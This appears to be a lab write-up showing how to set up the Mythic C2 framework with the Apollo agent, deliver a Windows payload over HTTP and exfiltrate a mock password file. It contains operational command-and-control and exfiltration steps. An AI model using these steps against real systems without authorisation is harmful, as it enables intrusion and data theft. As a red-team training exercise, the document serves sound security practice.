# Mythic C2 Framework Demonstration

This demonstration showcases the process of setting up and using the **Mythic C2 framework** for a red teaming scenario. In this example, I set up the **Apollo agent** on **Kali Linux** and targeted a **Windows Server** to simulate a controlled command and control (C2) environment. The focus is on setting up the C2 profile, generating a payload, deploying it, and demonstrating a post-exploitation task.

## Setting Up Mythic and Apollo Agent

I began by installing the Mythic C2 framework on **Kali Linux**. Mythic offers a versatile C2 platform with multiple agents, and for this demonstration, I chose the **Apollo agent** due to its rich feature set and ease of configuration.

1. **Clone the Mythic repository** on Kali:
   ```bash
   git clone https://github.com/its-a-feature/Mythic
   cd Mythic

2. Install Apollo agent via Mythic’s command-line interface (CLI):

bash
Copy code
sudo ./mythic-cli install agent from https://github.com/MythicAgents/Apollo

3. Once installed, the Apollo agent appeared in the Mythic web GUI, ready for configuration.

Configuring HTTP C2 Profile
Next, I configured the HTTP C2 profile for communication between the attacker (C2 server) and the target (Windows Server). This involved setting up a communication channel that could handle traffic over HTTP.

1. Install the HTTP C2 profile from the Mythic GitHub repository:

bash
Copy code
sudo ./mythic-cli install c2_profile from https://github.com/MythicC2Profiles/http
2. In the Mythic web GUI, I set the C2 profile’s callback host to my public IP and selected port 80 for communication.

Creating and Deploying the Payload
With the agent and C2 profile in place, I moved forward with creating the payload. This payload was designed for Windows and configured to use the HTTP C2 profile for communication.

1. Generate the payload in the Mythic web GUI:

Choose the Apollo agent.
Configure the payload to target a Windows executable format.
Set the callback communication to use the HTTP profile with my Kali Linux server as the host.
Include necessary commands for post-exploitation.

2. Host the payload on Kali Linux using a Python HTTP server:

bash
Copy code
python3 -m http.server 9999
This allowed the Windows target machine to download the payload from my Kali machine, simulating a real-world payload delivery scenario.

Execution and Establishing C2
After the payload was downloaded and executed on the Windows Server, I confirmed that the C2 session was established through the Mythic web interface. The Apollo agent successfully called back to the C2 server, and the session was live.

Check active connections on the Windows target using:

bash
Copy code
netstat -anob
The process associated with the Apollo agent was visible, confirming the successful establishment of the C2 session.

Post-Exploitation: File Exfiltration
As part of the post-exploitation phase, I demonstrated the retrieval of sensitive information from the target system. I created a mock password file on the Windows Server named passwords.txt and stored it in the Administrator's Documents folder.

1. Password file setup: Before launching the attack, I created a text file with mock credentials on the target system:

plaintext
Copy code
C:/Users/Administrator/Documents/passwords.txt
2. Retrieve the file using the Apollo agent's download command:

bash
Copy code
download C:/Users/Administrator/Documents/passwords.txt
3. The contents of the file (Winter2024!) were successfully exfiltrated and displayed in the Mythic interface.

Conclusion
This demonstration highlights the flexibility of the Mythic C2 framework in establishing a C2 session and performing post-exploitation tasks, including file exfiltration. By leveraging the Apollo agent and the HTTP C2 profile, I was able to simulate a realistic attack scenario, showing the practical use of Mythic in red teaming exercises.

It's important to note that this demonstration was conducted in a controlled environment with Kali Linux and a test Windows Server. These techniques should only be used for ethical hacking purposes with explicit permission. Unauthorized use of these tools is illegal.


